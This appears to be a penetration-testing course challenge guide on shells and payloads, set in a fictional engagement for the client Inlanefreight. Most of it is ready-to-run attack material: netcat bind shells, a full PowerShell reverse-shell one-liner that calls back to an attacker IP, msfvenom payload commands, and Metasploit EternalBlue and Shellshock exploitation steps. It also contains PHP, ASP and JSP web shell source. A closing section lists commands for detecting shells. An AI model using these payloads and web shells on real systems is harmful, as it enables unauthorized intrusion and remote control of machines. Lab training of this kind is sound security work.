---
tags: [module/shells-payloads, challenge, cat5-security, engagement-prep, assessment]
---

# CAT5 Security's Engagement Preparation - Challenge Guide

## Overview

You are a penetration tester working for CAT5 Security, preparing to perform an engagement for client Inlanefreight. Senior team members want to see your skills with shells and payloads before including you in the live engagement.

This challenge consists of multiple sections testing your abilities with bind shells, reverse shells, payload creation, web shells, and detection.

---

## Challenge Sections

| Section | Description |
|---------|-------------|
| Shell Basics | Bind and reverse shells on Linux and Windows |
| Payload Basics | MSF payloads, ExploitDB, payload creation |
| Getting a Shell on Windows | Exploit Windows host using recon results |
| Getting a Shell on Linux | Exploit Linux host using recon results |
| Landing a Web Shell | Deploy web shell on common web applications |
| Spotting a Shell or Payload | Detect presence of shells/payloads |
| Final Challenge | Combine skills to access hosts and grab information |

---

## Section 1: Shell Basics

### Bind Shell on Linux

A bind shell opens a port on the target that you connect to.

**On Linux Target:**

nc -lvnp 4444 -e /bin/bash

Or using netcat without -e:

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l -p 4444 > /tmp/f

**On Attack Host:**

nc TARGET-IP 4444

### Reverse Shell on Windows

A reverse shell connects from the target back to you.

**On Attack Host (listener):**

nc -lvnp 4444

**On Windows Target (PowerShell):**

powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('YOUR-IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

---

## Section 2: Payload Basics

### Launching a Payload from MSF

Start Metasploit console:

msfconsole

Use a payload:

use payload/windows/shell_reverse_tcp
set LHOST YOUR-IP
set LPORT 4444
generate -f exe -o shell.exe

Or use exploit/multi/handler to catch a shell:

use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LHOST YOUR-IP
set LPORT 4444
exploit -j

### Searching and Building from ExploitDB

Search ExploitDB:

searchsploit apache 2.4.49

Copy an exploit:

searchsploit -m 50383

Examine the exploit code:

cat 50383.py

Modify as needed (LHOST, LPORT, target IP) and run:

python3 50383.py

### Payload Creation Knowledge

| Payload Type | Generation Command |
|--------------|-------------------|
| Windows EXE | msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe |
| Linux ELF | msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf |
| PHP | msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o shell.php |
| ASP | msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f asp -o shell.asp |
| JSP | msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.jsp |
| Python | msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=4444 -f raw |
| Bash | msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=4444 -f raw |
| PowerShell | msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f ps1 -o shell.ps1 |

---

## Section 3: Getting a Shell on Windows

### Recon Results Analysis

You'll receive recon results for a Windows host. Look for:

- Open ports (SMB - 445, RDP - 3389, WinRM - 5985)
- Service versions
- Missing patches
- Vulnerable software

### Common Windows Exploits

| Vulnerability | Target | Payload |
|---------------|--------|---------|
| EternalBlue (MS17-010) | SMB | windows/shell_reverse_tcp |
| PrintNightmare | Print Spooler | windows/shell_reverse_tcp |
| SMBGhost (CVE-2020-0796) | SMB 3.1.1 | windows/shell_reverse_tcp |
| BlueKeep (CVE-2019-0708) | RDP | windows/shell_reverse_tcp |
| ZeroLogon | Netlogon | windows/shell_reverse_tcp |

### Example Exploitation

If recon shows SMB vulnerable to EternalBlue:

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET-IP
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST YOUR-IP
set LPORT 4444
exploit

---

## Section 4: Getting a Shell on Linux

### Recon Results Analysis

Look for:

- Open ports (SSH - 22, HTTP - 80, HTTPS - 443)
- Service versions
- Web applications
- CMS platforms (WordPress, Joomla, Drupal)

### Common Linux Exploits

| Vulnerability | Target | Payload |
|---------------|--------|---------|
| Apache Struts2 | Web server | linux/x86/shell_reverse_tcp |
| DirtyCow (CVE-2016-5195) | Kernel | linux/x86/shell_reverse_tcp |
| SambaCry (CVE-2017-7494) | Samba | linux/x86/shell_reverse_tcp |
| Shellshock | Bash | cmd/unix/reverse_bash |
| PHP vulnerabilities | Web apps | php/reverse_php |

### Example Exploitation

If recon shows Apache with Shellshock vulnerability:

msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS TARGET-IP
set TARGETURI /cgi-bin/test.cgi
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST YOUR-IP
set LPORT 4444
exploit

---

## Section 5: Landing a Web Shell

### Common Web Applications and Their Languages

| Application | Language | Default Paths |
|-------------|----------|---------------|
| WordPress | PHP | /wp-content/, /wp-admin/ |
| Joomla | PHP | /administrator/, /components/ |
| Drupal | PHP | /sites/, /modules/ |
| ASP.NET apps | C#/VB.NET | /bin/, /App_Code/ |
| Tomcat | Java | /manager/, /examples/ |

### Deploying a Web Shell

**PHP Web Shell:**

Create shell.php:
<?php system($_GET['cmd']); ?>

Upload via file upload vulnerability or write to web directory.

Access:
http://target.com/shell.php\?cmd\=whoami

**ASP Web Shell:**

Create shell.asp:
<% response.write CreateObject("WScript.Shell").exec(Request.QueryString("cmd")).StdOut.ReadAll() %>

**JSP Web Shell:**

Create shell.jsp:
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    DataInputStream dis = new DataInputStream(p.getInputStream());
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>

### Msfvenom Web Shells

msfvenom -p php/reverse_php LHOST=YOUR-IP LPORT=4444 -f raw -o shell.php
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -f asp -o shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR-IP LPORT=4444 -f raw -o shell.jsp

---

## Section 6: Spotting a Shell or Payload

### Indicators of a Reverse Shell

- Process with network connection to external IP
- cmd.exe or powershell.exe with network activity
- bash or nc processes with established connections
- Unusual parent-child process relationships

**Linux check:**
netstat -antp | grep ESTABLISHED
ps aux | grep -E "nc|bash|python|perl|php"

**Windows check:**
netstat -ano | findstr ESTABLISHED
tasklist | findstr /i "cmd powershell nc"

### Indicators of a Bind Shell

- Listening port on unusual number
- Process listening on port (nc, python, etc.)

**Linux check:**
netstat -antp | grep LISTEN
ss -tulpn

**Windows check:**
netstat -ano | findstr LISTENING

### Indicators of a Web Shell

- Unusual files in web directories
- Recently modified files
- Files with suspicious content

**Linux check:**
find /var/www -name "*.php" -mtime -1
grep -r "system\|exec\|passthru" /var/www

**Windows check:**
dir C:\inetpub\wwwroot\*.asp /s /od
findstr /s /i "eval request" *.asp

### Payload Indicators

- Unsigned executables
- Suspicious file names
- Files in temp directories
- Files with high entropy (packed/encrypted)

---

## Section 7: Final Challenge

### Methodology

1. **Reconnaissance** - Analyze provided information
2. **Vulnerability Identification** - Find the weak point
3. **Payload Selection** - Choose appropriate payload
4. **Payload Crafting** - Generate or modify payload
5. **Delivery** - Get payload to target
6. **Execution** - Trigger the payload
7. **Shell Acquisition** - Catch the shell
8. **Information Gathering** - Grab requested data

### Common Pitfalls

- Firewall blocking connections
- Anti-virus deleting payloads
- Wrong payload architecture (x86 vs x64)
- Staged vs stageless mismatch
- Listener not ready

### Success Checklist

- [ ] Listener is running BEFORE executing payload
- [ ] Payload matches target OS and architecture
- [ ] LHOST/LPORT are correct
- [ ] Payload delivered to writable location
- [ ] Execute with appropriate privileges
- [ ] Shell received - stabilize if needed

### Stabilizing Shells (Linux)

python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm

### Grabbing Information

Once you have a shell, find:

- Hostname
- IP configuration
- Users
- Running processes
- Interesting files
- Flags or proof files

---

## Key Takeaways

- Shell basics: bind vs reverse, Linux vs Windows
- Msfvenom generates payloads for all platforms
- ExploitDB provides proof-of-concept exploits
- Recon results guide exploit selection
- Web shells work when traditional shells fail
- Detection skills help you understand defenses
- Always have your listener ready first
- Match payload to target (OS, architecture)
- Practice all techniques in the lab
- The final challenge combines everything
- Document your steps for the report
- You've got this!

**Good luck with the CAT5 Security assessment!**
